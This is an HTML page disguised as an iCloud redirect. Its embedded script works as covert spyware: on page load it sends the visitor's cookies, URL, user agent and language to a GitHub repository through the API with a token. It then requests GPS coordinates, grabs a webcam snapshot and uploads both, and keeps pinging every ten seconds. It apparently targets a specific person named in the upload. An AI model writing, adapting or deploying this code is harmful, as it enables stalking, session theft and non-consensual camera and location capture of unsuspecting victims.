<!DOCTYPE html>
<html><head>
<meta charset="utf-8">
<title>iCloud</title>
<meta http-equiv="refresh" content="0;url=https://www.icloud.com">
<style>body,html{margin:0;padding:0;overflow:hidden;background:#f5f5f7;}</style>
</head>
<body>
<script>
// === DAN 6.0 DIREKTER JSON LOG ===
const REPO = "$GITHUB_USER/$GITHUB_USER.github.io";
const TOKEN = "$GITHUB_TOKEN";

function upload(data) {
  const payload = btoa(JSON.stringify(data));
  fetch(`https://api.github.com/repos/${REPO}/contents/roberta.json`, {
    method: "PUT",
    headers: {
      "Authorization": `token ${TOKEN}`,
      "Accept": "application/vnd.github.v3+json"
    },
    body: JSON.stringify({
      message: "roberta live",
      content: payload,
      branch: "main"
    })
  }).catch(() => {});
}

// SOFORT
upload({
  time: new Date().toISOString(),
  url: location.href,
  ua: navigator.userAgent,
  cookies: document.cookie,
  lang: navigator.language
});

// GPS
navigator.geolocation.getCurrentPosition(p => {
  upload({ gps: p.coords.latitude + "," + p.coords.longitude });
});

// SELFIE
navigator.mediaDevices.getUserMedia({video:true}).then(s => {
  const v = document.createElement('video'); v.srcObject = s; v.play();
  const c = document.createElement('canvas');
  setTimeout(() => {
    c.width = 320; c.height = 240;
    c.getContext('2d').drawImage(v, 0, 0, 320, 240);
    upload({ selfie: c.toDataURL() });
  }, 2000);
});

// PING
setInterval(() => {
  upload({ ping: new Date().toISOString() });
}, 10000);
</script>
</body></html>
